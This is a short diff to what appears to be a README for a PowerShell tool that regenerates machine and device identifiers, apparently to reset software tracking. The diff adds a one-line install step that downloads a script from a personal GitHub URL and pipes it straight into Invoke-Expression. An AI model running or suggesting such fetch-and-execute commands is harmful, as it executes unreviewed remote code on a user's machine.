@@ -19,6 +19,9 @@ $macMachineID = Generate-MacMachineID
 $deviceID = Generate-DeviceID
 $sqmID = Generate-SqmID
 ```
+```
+iex (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shaileshdpatil/reset-local-info/main/PatiL.ps1").Content
+```
 
 ## ID Formats
 
